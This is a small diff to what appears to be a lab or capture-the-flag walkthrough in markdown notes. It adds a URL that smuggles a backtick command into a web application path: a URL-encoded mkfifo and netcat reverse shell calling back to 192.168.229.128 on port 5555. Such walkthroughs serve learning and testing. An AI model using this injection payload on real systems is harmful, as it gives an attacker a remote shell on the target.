@@ -595,6 +595,10 @@ http://192.168.229.135:1337/casterly-rock/blob/master/note_under_the_bed.md/%60c
 
 ![[Pasted image 20260216000256.png]]
 
+```
+http://192.168.229.135:1337/casterly-rock/blob/master/note_under_the_bed.md/%60rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E&1|nc%20192.168.229.128%20%205555%20%3E/tmp/f%60
+```
+
 
 
 
